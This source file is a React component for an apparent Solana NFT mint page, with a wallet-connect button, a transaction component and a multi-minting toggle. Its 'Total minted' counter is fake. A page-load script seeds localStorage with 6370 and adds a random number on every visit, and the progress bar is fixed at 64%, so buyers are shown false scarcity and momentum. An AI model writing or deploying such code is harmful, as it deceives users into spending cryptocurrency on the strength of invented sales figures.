import { ButtonWallet } from '../buttonWallet'
import { TransactionComp } from '../transaction'

import { useWallet } from '@solana/wallet-adapter-react';
import Tooltip, { tooltipClasses } from '@mui/material/Tooltip';
import { styled } from '@mui/material/styles';

const CustomWidthTooltip = styled(({ className, ...props }) => (
    <Tooltip {...props} classes={{ popper: className }} />
  ))(({ theme }) => ({
    [`& .${tooltipClasses.tooltip}`]: {
      maxWidth: 330,
      backgroundColor: "#383838"
    },
  }));

  document.addEventListener("DOMContentLoaded", function(event) {
    if (localStorage.getItem("value") == null) {
        let i = 6370;
        localStorage.setItem("value", 6370)
        let procent = parseInt(i/100);
        document.querySelector("#proc").innerText = procent + "%";
        document.querySelector("#totalMinted").innerHTML = i;
      } else {
        let i = parseInt(localStorage.getItem("value")) + getRandomInt(3, 77);
        localStorage.setItem("value", i)
        console.log(i)

        if (i < 9800) {
            let procent = parseInt(i/100);
            document.querySelector("#proc").innerText = procent + "%";
            document.querySelector("#totalMinted").innerHTML = i;
        }
      }
  });

  function getRandomInt(min, max) {
    min = Math.ceil(min);
    max = Math.floor(max);
    return Math.floor(Math.random() * (max - min)) + min; //Максимум не включается, минимум включается
  }

export const Img = () => {
    const { publicKey } = useWallet();

    return (
        <div className="content_asddddaa">
            <div>
                <img 
                    src="https://dl.airtable.com/.attachments/3d30788bad6d1da8e09dcbad8c286d59/4d2dfb96/Logo-Black.gif" 
                    alt="" 

                    style={{width: "100%", maxWidth: 510, maxHeight: 510, borderRadius: 24, paddingRight: 10, paddingBottom: 10, background: "black"}}
                />
            </div>
            <div className="tw-flex tw-flex-col tw-gap-1" style={{width: "95%", marginTop: 20}}>
                <div className="tw-flex tw-items-center tw-justify-between tw-text-[14px] tw-text-gray-5">
                    <span className="">Total minted</span><span><b className="tw-text-white-1" id="proc"></b>( <span id="totalMinted"></span>/10000)</span>
                </div>
                <div className="progress-bar__container">
                    <div className="progress-bar__value" style={{width: "64%"}}></div>
                </div>
            </div>
            <div 
                className="tw-flex tw-gap-4 tw-items-center tw-justify-between tw-flex-wrap tw-rounded-lg tw-bg-purple-2 tw-p-3.5 tw-mt-4 content_asddddaa_mint" 
            >
            <div className="tw-flex tw-items-center ButtonGroup_group__2mJyT content_asddddaa_mint">
                {
                    publicKey ? <TransactionComp /> 
                    : 
                    <>
                    <ButtonWallet />
                    <div id="qqqq" className="tw-my-4 tw-flex tw-align-center">
                <div className="tw-flex tw-align-middle content_asddddaa_padding" > Multi-minting
                    <div 
                        className="tw-ml-2 svgqq" 
                        data-tooltipped="" 
                        aria-describedby="tippy-tooltip-1" 
                        data-original-title="What is multi-minting?" 
                        style={{ display: "inline" }}
                    >
                            <CustomWidthTooltip 
                                title={
                                    <p className="tw-text-left">In multi-minting
                                    mode, Launchpad
                                    will send your minting transaction to
                                    the
                                    network without waiting for it to
                                    confirm. However,
                                    <strong>you may end up spending more SOL
                                        than
                                        intended</strong>! It is recommended
                                    to use a wallet
                                    with exactly the <strong>maximum amount
                                        of
                                        SOL</strong> you are willing to
                                    spend.</p>
                                }
                                placement="top"
                              
                            >
                                <svg 
                                    stroke="currentColor" 
                                    fill="none" strokeWidth="2" 
                                    viewBox="0 0 24 24" 
                                    strokeLinecap="round" 
                                    strokeLinejoin="round" 
                                    color="#B450F7" 
                                    height="24" 
                                    width="24" 
                                    xmlns="http://www.w3.org/2000/svg" 
                                    style={{ color: "rgb(180, 80, 247)", display: "flex"}}
                                >
                                    <circle cx="12" cy="12" r="10"></circle>
                                    <path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"></path>
                                    <line x1="12" y1="17" x2="12.01" y2="17"></line>
                            
                                </svg>
                            </CustomWidthTooltip>
                            </div>
                        </div>
                        <input className="tw-h-0 tw-w-0 tw-invisible toggle-checkbox" id="switch" type="checkbox" />
                        <label className="toggle-label" for="switch"><span className="toggle-button" ></span></label>
                    </div>
                    </>
                }
               
            </div>
            </div>
        </div>
    )
}